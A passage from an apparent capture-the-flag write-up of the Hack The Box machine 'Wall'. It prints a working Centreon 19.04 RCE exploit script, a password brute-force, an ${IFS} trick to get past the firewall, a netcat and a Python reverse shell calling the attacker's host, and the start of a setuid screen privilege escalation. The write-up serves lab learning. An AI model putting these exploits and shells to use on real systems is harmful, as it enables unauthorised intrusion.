(Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 13.37 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80 and the ssh port 22 open.</p><p>Opening <a href="http://wall.htb" target="_blank" rel="noopener">http://wall.htb</a> display the Apache2 Ubuntu Default Page as <code>nmap</code> told us:</p><p><img src="https://user-images.githubusercontent.com/9076747/67693154-8bae0800-f9a1-11e9-995d-b2fb18a8a970.png" alt="Wall website"></p><p>The source code of the page do not reveal any sneaky hidden code so let’s move on.</p><p>We launch <code>gobuster</code> to see if we can find interresting files and/or directories :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://wall.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/aa.php (Status: 200)</span><br><span class="line">/monitoring (Status: 401)</span><br><span class="line">/panel.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2019/10/28 16:39:57 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>Two files looks interesting here : <code>aa.php</code> and <code>panel.php</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ http wall.htb/aa.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 1</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 28 Oct 2019 15:48:45 GMT</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ http wall.htb/panel.php</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 26</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 28 Oct 2019 15:49:13 GMT</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Just a <span class="built_in">test</span> <span class="keyword">for</span> php file !</span><br></pre></td></tr></table></figure><p>Hum we do not have too much informations here. <code>/monitoring</code> and <code>/server-status</code> prompt Basic Auth.</p><p>From here we didn’t make a lot of progress. Trying to brute-force the Basic Auth of <code>/monitoring</code> and <code>/server-status</code> doesn’t gives results. We don’t even have any particular informations on the two php files.<br>After getting into rabbit holes for a few times I decided to try different HTTP Method on the php endpoints with a simple command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="keyword">for</span> method <span class="keyword">in</span> GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span class="keyword">do</span></span><br><span class="line">&gt; <span class="built_in">echo</span> <span class="string">"\n<span class="variable">$method</span>:"</span></span><br><span class="line">&gt; curl -X <span class="variable">$method</span> http://wall.htb/aa.php</span><br><span class="line">&gt; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>No interresting results, neither on <code>panel.php</code>. Out of despair I decide to try on the <code>/monitoring</code> endpoint. And finally:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="keyword">for</span> method <span class="keyword">in</span> GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span class="keyword">do</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"\n<span class="variable">$method</span>:"</span></span><br><span class="line">   curl -X <span class="variable">$method</span> http://wall.htb/monitoring/</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">[...]</span><br><span class="line">POST:</span><br><span class="line">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"0; URL='/centreon'"</span> /&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Interresting, the <code>/centreon</code> endpoint slipped from the <code>gobuster</code> enumeration. Maybe a bigger wordlist might have discovered it. For future references I add this endpoint to the wordlist I use the most :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> centreon &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure><p>We got our initial foothold. Opening the page show the classical Centreon login page :</p><p><img src="https://user-images.githubusercontent.com/9076747/67695628-ab472f80-f9a5-11e9-8047-3febc7e9a9a9.png" alt="Wall Centreon login page"></p><p>For reference :</p><blockquote><p>Centreon is a network, system, applicative supervision and monitoring tool<br><a href="https://www.centreon.com" target="_blank" rel="noopener">https://www.centreon.com</a></p></blockquote><p>The login page display the version number: <code>v. 19.04.0</code>. Searching for exploits on this version we found a Remote Code Execution vulnerability:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ getsploit centreon</span><br><span class="line">Total found exploits: 10</span><br><span class="line">Web-search URL: https://vulners.com/search?query=bulletinFamily%3Aexploit+AND+centreon</span><br><span class="line"></span><br><span class="line">Centreon 19.04  - Remote Code | https://vulners.com/exploitdb/EDB-ID:47069</span><br></pre></td></tr></table></figure><p>Unfortunately this is a Authenticated RCE and we have no way to bypass authentication. Since we don’t have any clues, let’s try to bruteforce with user <code>admin</code>.</p><p>To avoid the struggle of <code>centreon</code> token on the login page we will use the Centreon API instead. The documentation is available on the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication" target="_blank" rel="noopener">Centreon documentation</a>.</p><p>I like to use <a href="https://github.com/berzerk0/Probable-Wordlists" target="_blank" rel="noopener">Probable-Wordlists</a> instead of the classic <code>rockyou.txt</code> that countains too much garbages:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top304Thousand-probable-v2.txt</span><br><span class="line">2019-10-28 17:38:52 (15.4 MB/s) - ‘Top304Thousand-probable-v2.txt’ saved [2811012/2811012]</span><br><span class="line">[hg8@archbook ~]$ wfuzz -z file,Top304Thousand-probable-v2.txt -d <span class="string">"username=admin&amp;password=FUZZ"</span> --hc 403 http://wall.htb/centreon/api/index.php\?action\=authenticate</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.1 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://wall.htb/centreon/api/index.php?action=authenticate</span><br><span class="line">Total requests: 303872</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000048:   200        0 L      1 W      61 Ch       <span class="string">"password1"</span>                                                                                                                                                                                                                                                                        ^C</span><br></pre></td></tr></table></figure><p>We now have the credentials, let’s login and try to execute the exploit. The exploit author wrote a <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" target="_blank" rel="noopener">blog post</a> explaining in detail the issue and how the exploit work. It’s a very useful ressource to tweak the exploit to make it working on this box.</p><p>I had to tweak a few lines to make it work it work properly on that box, my final script was :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">"ignore"</span>, category=UserWarning, module=<span class="string">'bs4'</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://wall.htb/centreon"</span></span><br><span class="line">username = <span class="string">"admin"</span></span><br><span class="line">password = <span class="string">"password1"</span></span><br><span class="line">ip = <span class="string">"10.10.10.10"</span></span><br><span class="line">port = <span class="number">8585</span></span><br><span class="line"></span><br><span class="line">command = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">request = requests.session()</span><br><span class="line">print(<span class="string">"[+] Retrieving CSRF token to submit the login form"</span>)</span><br><span class="line">page = request.get(url+<span class="string">"/index.php"</span>)</span><br><span class="line">html_content = page.text</span><br><span class="line">soup = BeautifulSoup(html_content, features=<span class="string">"html.parser"</span>)</span><br><span class="line">token = soup.findAll(<span class="string">'input'</span>)[<span class="number">3</span>].get(<span class="string">"value"</span>)</span><br><span class="line"></span><br><span class="line">login_info = &#123;</span><br><span class="line">    <span class="string">"useralias"</span>: username,</span><br><span class="line">    <span class="string">"password"</span>: password,</span><br><span class="line">    <span class="string">"submitLogin"</span>: <span class="string">"Connect"</span>,</span><br><span class="line">    <span class="string">"centreon_token"</span>: token</span><br><span class="line">&#125;</span><br><span class="line">login_request = request.post(url+<span class="string">"/index.php"</span>, login_info)</span><br><span class="line">print(<span class="string">"[+] Login token is : &#123;0&#125;"</span>.format(token))</span><br><span class="line"><span class="keyword">if</span> <span class="string">"Your credentials are incorrect."</span> <span class="keyword">not</span> <span class="keyword">in</span> login_request.text:</span><br><span class="line">    print(<span class="string">"[+] Logged In"</span>)</span><br><span class="line">    print(<span class="string">"[+] Retrieving Poller token"</span>)</span><br><span class="line"></span><br><span class="line">    poller_configuration_page = url + <span class="string">"/main.get.php?p=60901"</span></span><br><span class="line">    get_poller_token = request.get(poller_configuration_page)</span><br><span class="line">    poller_html = get_poller_token.text</span><br><span class="line">    poller_soup = BeautifulSoup(poller_html, features=<span class="string">"html.parser"</span>)</span><br><span class="line">    poller_token = poller_soup.findAll(<span class="string">'input'</span>)[<span class="number">25</span>].get(<span class="string">"value"</span>)</span><br><span class="line">    print(<span class="string">"[+] Poller token is : &#123;0&#125;"</span>.format(poller_token))</span><br><span class="line"></span><br><span class="line">    payload_info = &#123;</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"Central66"</span>,</span><br><span class="line">        <span class="string">"ns_ip_address"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">        <span class="string">"localhost[localhost]"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"is_default[is_default]"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"remote_id"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"ssh_port"</span>: <span class="string">"22"</span>,</span><br><span class="line">        <span class="string">"init_script"</span>: <span class="string">"centengine"</span>,</span><br><span class="line">        <span class="string">"nagios_bin"</span>: command,</span><br><span class="line">        <span class="string">"nagiostats_bin"</span>: <span class="string">"/usr/sbin/centenginestats"</span>,</span><br><span class="line">        <span class="string">"nagios_perfdata"</span>: <span class="string">"/var/log/centreon-engine/service-perfdata"</span>,</span><br><span class="line">        <span class="string">"centreonbroker_cfg_path"</span>: <span class="string">"/etc/centreon-broker"</span>,</span><br><span class="line">        <span class="string">"centreonbroker_module_path"</span>: <span class="string">"/usr/share/centreon/lib/centreon-broker"</span>,</span><br><span class="line">        <span class="string">"centreonbroker_logs_path"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"centreonconnector_path"</span>: <span class="string">"/usr/lib64/centreon-connector"</span>,</span><br><span class="line">        <span class="string">"init_script_centreontrapd"</span>: <span class="string">"centreontrapd"</span>,</span><br><span class="line">        <span class="string">"snmp_trapd_path_conf"</span>: <span class="string">"/etc/snmp/centreon_traps/"</span>,</span><br><span class="line">        <span class="string">"ns_activate[ns_activate]"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"submitC"</span>: <span class="string">"Save"</span>,</span><br><span class="line">        <span class="string">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"o"</span>: <span class="string">"c"</span>,</span><br><span class="line">        <span class="string">"centreon_token"</span>: poller_token,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send_payload = request.post(poller_configuration_page, payload_info)</span><br><span class="line">    print(send_payload.text)</span><br><span class="line">    print(<span class="string">"[+] Injecting Done."</span>)</span><br><span class="line">    generate_xml_page = url + <span class="string">"/include/configuration/configGenerate/xml/generateFiles.php"</span></span><br><span class="line">    xml_page_data = &#123;</span><br><span class="line">        <span class="string">"poller"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"debug"</span>: <span class="string">"true"</span>,</span><br><span class="line">        <span class="string">"generate"</span>: <span class="string">"true"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = request.post(generate_xml_page, xml_page_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[-] Wrong credentials"</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>The exploit takes one argument which is the command we want to run. Let’s try to run a <code>netcat</code> reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">"nc -e /bin/sh 10.0.0.1 8585"</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">'t have permission to access /centreon/main.get.php</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wall.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Injecting Done.</span></span><br></pre></td></tr></table></figure><p>Hum, we get stuck with <code>Forbidden</code>.</p><p>Seems like a WAF (web application firewall) is in place (probably the why the box name is <code>Wall</code>). When we send a simple test command, like <code>test</code> the injection succeed. Let’s try to send a few special char we had in our netcat command to find which one exactly is filtered :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">"-/,."</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>No blocking this time… So what remains ? The space of course…. Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">"test test"</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You don<span class="string">'t have permission to access /centreon/main.get.php</span></span><br><span class="line"><span class="string">on this server.&lt;br /&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at wall.htb Port 80&lt;/address&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Injecting Done.</span></span><br></pre></td></tr></table></figure><p>So now we have to find a solution to use command without spaces… Searching a bit online we find that it’s possible to use the <a href="https://en.wikipedia.org/wiki/Internal_field_separator" target="_blank" rel="noopener">Internal field separator</a> :</p><blockquote><p>The shell treats each character of $IFS as a delimiter, and splits the results of the other expansions into words on these characters.</p></blockquote><p>Let’s give it try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span><span class="variable">$IFStest</span></span><br><span class="line">[hg8@archbook ~]$</span><br></pre></td></tr></table></figure><p>Unfortunately this doesn’t seems to work but using the brackets works!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span><span class="variable">$&#123;IFS&#125;</span><span class="built_in">test</span></span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Let’s try edit our exploit to replace spaces with the IFS:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">command = sys.argv[1]</span><br><span class="line"><span class="addition">+ command = command.replace(' ', '$&#123;IFS&#125;')</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>This time we are going to open a local web server to have feedback on wether our command injection worked on not. In a new terminal let’s open a python simple http server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And let’s run our exploit again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">"wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py"</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : 56855cc04ceb87148ce7d83c4b90bd9e</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : 7b642628745280f86fc6100f43fd7ad9</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>And on our web server we see a new entry:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.10 - - [29/Oct/2019 13:29:27] <span class="string">"GET /hg8.py HTTP/1.1"</span> 200 -</span><br></pre></td></tr></table></figure><p>The <code>hg8.py</code> countains a python reverse shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"10.0.0.1"</span>,<span class="number">8585</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure><p>Since we managed to write it to the server, let’s run it now. We first open our <code>nc</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And run the exploit again :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit.py <span class="string">"python /tmp/hg8.py"</span></span><br><span class="line">[+] Retrieving CSRF token to submit the login form</span><br><span class="line">[+] Login token is : b4710792d09b371b03c9ef6d3bbf3f26</span><br><span class="line">[+] Logged In</span><br><span class="line">[+] Retrieving Poller token</span><br><span class="line">[+] Poller token is : c7f63cd8143107496edfdb8ac304b5ca</span><br><span class="line">[+] Injecting Done.</span><br></pre></td></tr></table></figure><p>And the shell open in our reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.157:50472</span><br><span class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span></span><br></pre></td></tr></table></figure><p>We got our first shell. Time to move onto the user flag.</p><p>Let’s enumerate what we have here :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /home</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 6 shelby     shelby     4096 Jul 30 17:37 shelby</span><br><span class="line">drwxr-xr-x 5 sysmonitor sysmonitor 4096 Jul  6 15:07 sysmonitor</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>Interresting, I always run a search for binaries with setuid bit enabled first and this returned <code>screen</code> in version 4.5.0.</p><p>As a reminder :</p><blockquote><p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p></blockquote><p>After a bit of search we stumbled upon a <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html" target="_blank" rel="noopener">bug</a> that allows to privilege escalte to root with <code>screen</code> 4.5.0 and setuid bit set.<br>Let’s give it a try !</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh</span><br><span class="line">2019-10-29 14:59:15 (4.83 MB/s) - ‘screenroot.sh’ saved [1152/1152]</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) 